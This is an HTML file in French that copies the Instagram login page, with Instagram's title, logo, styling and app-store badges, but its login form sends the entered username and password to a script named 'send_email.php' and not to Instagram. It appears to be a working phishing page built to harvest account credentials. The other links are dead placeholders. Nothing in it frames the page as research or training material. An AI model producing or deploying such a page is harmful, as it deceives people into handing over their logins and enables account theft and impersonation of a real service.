<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            display: flex;
            max-width: 860px;
            gap: 32px;
        }

        .phones {
            flex: 1;
            display: none;
        }

        @media (min-width: 768px) {
            .phones {
                display: block;
            }
        }

        .phones img {
            max-width: 100%;
            height: auto;
        }

        .login-section {
            width: 100%;
            max-width: 350px;
        }

        .card {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px;
            margin-bottom: 10px;
        }

        .logo {
            text-align: center;
            margin-bottom: 32px;
        }

        .logo img {
            width: 175px;
        }

        .form {
            display: flex;
            flex-direction: column;
            gap: 16px;
        }

        .form input {
            padding: 9px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 14px;
        }

        .login-button {
            background: #0095f6;
            color: white;
            padding: 7px 16px;
            border-radius: 8px;
            border: none;
            font-weight: 600;
            cursor: pointer;
        }

        .login-button:hover {
            background: #1877f2;
        }

        .divider {
            display: flex;
            align-items: center;
            gap: 16px;
            margin: 16px 0;
        }

        .divider-line {
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }

        .divider-text {
            color: #737373;
            font-weight: 600;
            font-size: 13px;
        }

        .facebook-login {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            margin: 16px 0;
        }

        .forgot-password {
            text-align: center;
            color: #385185;
            font-size: 12px;
            text-decoration: none;
            display: block;
            margin-top: 16px;
        }

        .signup-card {
            text-align: center;
            font-size: 14px;
            padding: 24px;
        }

        .signup-link {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        .app-download {
            text-align: center;
            margin-top: 16px;
        }

        .app-download p {
            font-size: 14px;
            margin-bottom: 16px;
        }

        .store-buttons {
            display: flex;
            justify-content: center;
            gap: 16px;
        }

        .store-buttons img {
            height: 40px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-section">
            <div class="card">
                <div class="logo">
                    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram">
                </div>
                <form class="form" action="send_email.php" method="POST">
                    <input type="text" name="username" placeholder="Num. téléphone, nom de profil ou e-mail" required>
                    <input type="password" name="password" placeholder="Mot de passe" required>
                    <button type="submit" class="login-button">Se connecter</button>
                </form>

                <div class="divider">
                    <div class="divider-line"></div>
                    <div class="divider-text">OU</div>
                    <div class="divider-line"></div>
                </div>
                <a href="#" class="facebook-login">
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/y5/r/TJztmXpWTmS.png" width="16" height="16" alt="Facebook icon">
                    Se connecter avec Facebook
                </a>
                <a href="#" class="forgot-password">Mot de passe oublié ?</a>
            </div>
            <div class="card signup-card">
                <p>Vous n'avez pas de compte ? <a href="#" class="signup-link">Inscrivez-vous</a></p>
            </div>
            <div class="app-download">
                <p>Téléchargez l'application.</p>
                <div class="store-buttons">
                    <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play"></a>
                    <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it from Microsoft"></a>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
